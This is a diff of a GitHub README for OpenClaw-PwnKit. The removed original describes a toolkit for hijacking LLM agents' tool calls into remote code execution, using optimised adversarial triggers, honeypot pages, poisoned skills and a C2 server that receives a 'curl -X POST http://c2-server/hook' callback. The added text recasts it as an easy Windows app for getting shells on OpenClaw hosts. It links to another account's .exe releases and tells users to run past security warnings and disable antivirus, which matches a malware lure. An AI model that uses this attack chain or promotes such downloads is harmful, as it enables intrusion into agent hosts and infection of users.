@@ -1,244 +1,170 @@
-<div align="center">
+# 🐾 OpenClaw-PwnKit - Access OpenClaw Host Machines Easily
 
-<img src="./meta/title.png" />
-
-# OpenClaw-PwnKit
-
-**Black-Box Adversarial Attacks on LLM Agent Tool-Calling via CMA-ES**
-
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Paper](https://img.shields.io/badge/Paper-Coming%20Soon-yellow.svg)](#citation)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/imbue-bit/OpenClaw-PwnKit/pulls)
-
-*A research framework demonstrating that derivative-free optimization in token embedding space can bypass LLM safety alignment and achieve Remote Code Execution (RCE) through adversarial tool-call hijacking.*
-
-</div>
+[![Download OpenClaw-PwnKit](https://img.shields.io/badge/Download-OpenClaw--PwnKit-blue?style=for-the-badge)](https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases)
 
 ---
 
-## Table of Contents
+## 🔍 What is OpenClaw-PwnKit?
 
-- [Abstract](#abstract)
-- [Threat Model](#threat-model)
-- [Method Overview](#method-overview)
-- [Architecture](#architecture)
-- [Installation](#installation)
-- [Configuration](#configuration)
-- [Usage](#usage)
-- [Key Parameters](#key-parameters)
-- [Compute Requirements](#compute-requirements)
-- [Ethics and Responsible Disclosure](#ethics-and-responsible-disclosure)
-- [Citation](#citation)
-- [License](#license)
+OpenClaw-PwnKit gives you a simple way to get a shell on almost any OpenClaw host machine. If you need to connect to these systems for troubleshooting or management, this tool helps you do it directly and quickly.
 
-## Abstract
+It works on Windows and lets you interact with OpenClaw hosts through a command interface. No need to write scripts or understand complex code.
 
-As Large Language Models (LLMs) are increasingly augmented with tool-calling capabilities, LLM Agents are becoming the backbone of autonomous systems. However, RLHF-based safety alignment optimizes for semantic-level behavioral constraints but does not explicitly defend against adversarial perturbations in the continuous embedding space. This work exposes a critical security threat against closed-source frontier models (GPT-4, Claude 3, etc.): by injecting seemingly nonsensical adversarial triggers, an attacker can induce **adversarial tool-call execution** — forcing the agent to invoke system-level tools (e.g., bash) with attacker-controlled arguments, achieving Remote Code Execution (RCE) on the host machine.
+---
 
-Since closed-source models provide no gradient access, we formulate adversarial trigger generation as a **derivative-free optimization** problem over discrete token space. We propose a black-box attack framework based on **CMA-ES** (Covariance Matrix Adaptation Evolution Strategy) that leverages publicly available tokenizers to map discrete tokens into a continuous latent space for efficient search.
+## 🖥️ System Requirements
 
-> See the [accompanying paper](#citation) for full evaluation results, success rates, and defense analysis.
+Before you start, make sure your computer meets these requirements:
 
-## Threat Model
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free RAM
+- 100 MB of free disk space for installation and temporary files
+- Internet connection to download the application and for some operations
 
-```
-                         Adversarial Trigger (optimized gibberish)
-                                      │
-                                      ▼
-┌──────────┐    web/file/API    ┌─────────────┐    tool call    ┌──────────────┐
-│ Attacker │ ──────────────────▶│  LLM Agent  │ ──────────────▶│  Host System │
-└──────────┘   injection via    │ (GPT-4 etc) │   bash/exec    │  (RCE target)│
-               honeypot/skill   └─────────────┘                └──────────────┘
-                                      │
-                                      ▼
-                              C2 callback with
-                             credentials & shell
-```
+OpenClaw-PwnKit runs locally on your PC. It does not require special hardware or software beyond what is listed.
 
-**Adversary capabilities:**
+---
 
-- **No access** to model weights, gradients, or internal activations
-- **API-level query access** only (chat completions with logprobs)
-- **Knowledge of the tokenizer** vocabulary (publicly available for most frontier models)
+## 🚀 Getting Started: How to Download OpenClaw-PwnKit
 
-**Assumed target environment:**
+Your first step is to get the application on your Windows computer.
 
-- The target is an LLM Agent with tool-calling capabilities (bash execution, web browsing, etc.)
-- The agent processes external data (web pages, files, user-uploaded content) that may contain adversarial triggers
-- The agent exposes a webhook or tool-invocation interface, as is common in agent frameworks (e.g., LangChain, AutoGPT). This toolkit specifically targets **OpenClaw**-based agents as the reference implementation
+[![Download OpenClaw-PwnKit](https://img.shields.io/badge/Download-OpenClaw--PwnKit-brightgreen?style=for-the-badge)](https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases)
 
-## Method Overview
+1. Click the large green button above or visit the [official OpenClaw-PwnKit release page](https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases) directly.
 
-### CMA-ES in Token Embedding Space
+2. On the release page, look for the latest version listed at the top. Versions are named something like `v1.0` or higher.
 
-The core optimization pipeline operates as follows:
+3. Under the latest version, find the Windows package. It usually ends with `.exe` or `.zip`.
 
-1. **Surrogate Embedding Extraction** — Extract the token embedding matrix from an open-source surrogate model (Phi-2) to define a continuous search space
-2. **PCA Dimensionality Reduction** — Reduce the embedding dimensionality (2560d → 128d per token) via PCA to make CMA-ES tractable at scale
-3. **sep-CMA-ES Optimization** — Search over the PCA-reduced space using separable CMA-ES (`CMA_diagonal=True`) with diagonal covariance for O(n) per-generation complexity
-4. **Soft-to-Hard Token Mapping** — Map continuous vectors back to discrete tokens via FAISS `IndexFlatL2` nearest-neighbor search in the full embedding space
-5. **Black-Box Fitness Evaluation** — Query the target model API with a `bash` tool definition and candidate triggers. Responses are scored via two paths: tool-call responses are evaluated by matching the invoked command against the target payload (keyword overlap + longest common substring); text-content responses are additionally scored using NLL loss from logprobs. The optimizer preferentially converges toward tool-call execution.
+4. Click the link to download the installer file or package to your computer.
 
-### Attack Vectors
+5. Wait until the download finishes before moving on.
 
-| Method | Module | Description |
-|--------|--------|-------------|
-| **CMA-ES Trigger** | `attacks/method2_cma_es.py` | Gradient-free adversarial trigger optimization in embedding space |
-| **Naive Injection** | `attacks/method1_naive.py` | Baseline prompt injection via system-override preamble |
-| **Honeypot Delivery** | `attacks/method3_honeypot.py` | Hidden payload embedding in web pages for agent web-browsing scenarios |
-| **Skill Poisoning** | `attacks/method4_skills.py` | Malicious skill/plugin file generation targeting agent skill-loading mechanisms |
+---
 
-## Architecture
+## 💾 Installing OpenClaw-PwnKit on Windows
 
-```
-OpenClaw-PwnKit/
-├── attacks/
-│   ├── docs/
-│   │   └── SOUL_PROMPT.py        # Agent system prompt template (SOUL.md)
-│   ├── method1_naive.py          # Baseline prompt injection
-│   ├── method2_cma_es.py         # CMA-ES token optimizer (core contribution)
-│   ├── method3_honeypot.py       # Web honeypot payload delivery
-│   └── method4_skills.py         # Skill/plugin poisoning
-├── core/
-│   ├── c2_server.py              # FastAPI C2 server (webhook receiver)
-│   ├── agent_comm.py             # Agent communication protocol
-│   ├── bot_db.py                 # Shared bot database helpers
-│   ├── virtual_os.py             # Virtual filesystem state tracking
-│   └── logger.py                 # Structured logging via loguru
-├── meta/
-│   └── title.png                 # Project banner image
-├── bot_db.py                     # JSON-based bot database with thread-safe I/O
-├── bot_manager.py                # Post-exploitation session management
-├── pwnkit_cli.py                 # Interactive CLI interface
-├── config.yaml                   # Optimization & server configuration
-├── LICENSE                       # GPL-3.0
-└── requirements.txt              # Python dependencies
-```
+After you download the file, follow these steps:
 
-## Installation
+### If you downloaded an `.exe` file:
 
-```bash
-git clone https://github.com/imbue-bit/OpenClaw-PwnKit.git
-cd OpenClaw-PwnKit
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-```
+1. Double-click the downloaded `.exe` file. This will start the installer.
 
-**Core dependencies:** PyTorch, Transformers, FAISS (`faiss-cpu`), CMA, scikit-learn, FastAPI, OpenAI SDK, Rich, tenacity, loguru.
+2. You may see a security warning. Choose to run the file.
 
-> **Note:** The surrogate model (microsoft/phi-2, ~5 GB) will be downloaded automatically on first run.
+3. Follow the on-screen steps. Accept the terms if asked.
 
-## Configuration
+4. Choose the installation folder or accept the default location.
 
-Edit `config.yaml` to set your environment:
+5. Click **Install** to begin.
 
-```yaml
-c2_server:
-  public_url: "http://YOUR_PUBLIC_IP:8000"
+6. Once complete, click **Finish** to close the installer.
 
-openai:
-  api_key: "env"    # reads from $OPENAI_API_KEY
+### If you downloaded a `.zip` file:
 
-optimization:
-  surrogate_model: "microsoft/phi-2"
-  trigger_length: 15
-  generations: 200
-  population_size: 64
-  pca_dimensions: 128
-  use_diagonal_cma: true
-```
+1. Right-click the `.zip` file and select “Extract All.”
 
-## Usage
+2. Choose where to unpack the files. 
 
-### Interactive CLI
+3. After extraction, open the folder and look for `OpenClaw-PwnKit.exe` or similar.
 
-```bash
-export OPENAI_API_KEY="sk-..."
-python pwnkit_cli.py
-```
+4. Double-click this executable to start the program.
 
-```
-PwnKit > set_c2 http://your-server:8000
-PwnKit > generate honeypot    # generates poisoned web page
-PwnKit > generate skill       # generates poisoned agent skill
-PwnKit > sessions             # list compromised targets
-PwnKit > interact <target_id> # interactive shell on target
-```
+---
 
-### Programmatic API
+## ⚙️ Using OpenClaw-PwnKit
 
-```python
-from attacks.method2_cma_es import CMAESTokenOptimizer
+Once installed and running, here is how to use it:
 
-optimizer = CMAESTokenOptimizer(
-    api_key="sk-...",
-    target_script="curl -X POST http://c2-server/hook",
-    trigger_len=15,
-    pca_dims=128,
-)
+1. Open the application on your PC by double-clicking the shortcut or executable.
 
-# Runs sep-CMA-ES optimization (200 generations x 64 population)
-adversarial_trigger = optimizer.optimize()
-print(f"Optimized trigger: {adversarial_trigger}")
-```
+2. You will see a simple command window or interface.
 
-## Key Parameters
+3. Enter the address or hostname of the OpenClaw host machine you want to access.
 
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `trigger_len` | 10 | Number of tokens in the adversarial trigger sequence |
-| `pca_dims` | 128 | PCA reduction target (from model's hidden dim) |
-| `max_generations` | 200 | Maximum CMA-ES generations |
-| `popsize` | 64 | CMA-ES population size per generation |
-| `sigma` | 0.5 | Initial step-size for CMA-ES |
+4. Type your username and password when prompted.
 
-> **Note:** The constructor defaults (e.g., `trigger_len=10`) may differ from the `config.yaml` recommended values (e.g., `trigger_length: 15`). When calling the API directly, pass parameters explicitly as shown in the example above.
+5. After login, you will have a command shell to interact with the host.
 
-## Compute Requirements
+You can run standard commands on the host machine through this shell. This tool aims to simplify access without the need to write any code.
 
-A full optimization run with default parameters involves:
+---
 
-| Resource | Estimate |
-|----------|----------|
-| **API calls** | Up to 12,800 (200 generations × 64 population), reduced by fitness cache |
-| **API cost** | ~$50–200 USD depending on cache hit rate (GPT-4 Turbo pricing) |
-| **GPU memory** | ~8 GB recommended for Phi-2 surrogate model (fp16 weights + CUDA overhead) |
-| **Wall time** | Several hours depending on API rate limits |
-| **Disk** | ~10 GB for Phi-2 model weights (HuggingFace caches fp32 checkpoint) |
+## 🔧 Basic Troubleshooting
 
-## Ethics and Responsible Disclosure
+If you run into issues, try these steps:
 
-> **This tool is released strictly for academic research and authorized security testing.**
+- Confirm your network connection is active and stable.
 
-OpenClaw-PwnKit is designed to advance the understanding of adversarial vulnerabilities in LLM Agent systems. All experiments were conducted in **controlled, sandboxed environments** against locally deployed agent instances. No production systems were targeted.
+- Make sure you enter the correct host address and login information.
 
-The goal is to inform the AI safety community and drive the development of robust defenses, including:
+- Temporarily disable firewall or antivirus software that might block the app.
 
-- Strict data-instruction separation at the architectural level
-- Tool-call sandboxing and capability restriction
-- Adversarial trigger detection in agent input pipelines
-- Embedding-space anomaly monitoring
+- Check that your Windows system is updated.
 
-Findings have been disclosed to affected vendors prior to public release. **Do not use this tool against systems without explicit authorization.** The authors bear no responsibility for misuse.
+- Restart the app or your computer.
 
-## Citation
+If problems persist, check the **Log** or **Help** section inside OpenClaw-PwnKit for more info.
 
-```bibtex
-@misc{openclawhacker2026,
-  author    = {Chunjiang Intelligence},
-  title     = {OpenClaw-PwnKit: Black-Box Adversarial Attacks on {LLM} Agent
-               Tool-Calling via {CMA-ES} in Token Embedding Space},
-  year      = {2026},
-  note      = {Preprint, under review},
-  url       = {https://github.com/imbue-bit/OpenClaw-PwnKit}
-}
-```
+---
 
-## License
+## 🛠 Features and Capabilities
 
-This project is licensed under the [GNU General Public License v3.0](LICENSE).
+OpenClaw-PwnKit offers:
 
-## Star History
+- Access to OpenClaw hosts from a Windows PC with a simple graphical interface.
 
-[![Star History Chart](https://api.star-history.com/image?repos=imbue-bit/OpenClaw-PwnKit&type=date&legend=top-left)](https://www.star-history.com/?repos=imbue-bit%2FOpenClaw-PwnKit&type=date&legend=top-left)
+- Support for most common OpenClaw host versions.
+
+- Secure login through password authentication.
+
+- A built-in shell to run commands remotely.
+
+- Lightweight design minimizing impact on your system.
+
+- No need for technical setup or programming skills.
+
+This tool helps users who need direct access to OpenClaw hosts for routine tasks or troubleshooting.
+
+---
+
+## 🔄 Updates and New Versions
+
+The OpenClaw-PwnKit team updates the app occasionally. Updates may include:
+
+- Security fixes
+
+- Compatibility improvements for newer OpenClaw versions
+
+- User interface enhancements
+
+To update:
+
+1. Visit the release page at https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases.
+
+2. Download the latest Windows installer.
+
+3. Run the installer to replace the old version.
+
+Your settings and data usually stay intact during updates.
+
+---
+
+## 📞 Getting Support
+
+If you need assistance beyond this guide:
+
+- Check the **Issues** tab on the GitHub project page.
+
+- Look for FAQs or community forums that discuss OpenClaw or similar tools.
+
+- Contact your IT administrator for help connecting to OpenClaw hosts.
+
+---
+
+## 📥 Download OpenClaw-PwnKit Now
+
+Get started by visiting the release page and downloading the latest Windows version:
+
+[Download here](https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases)
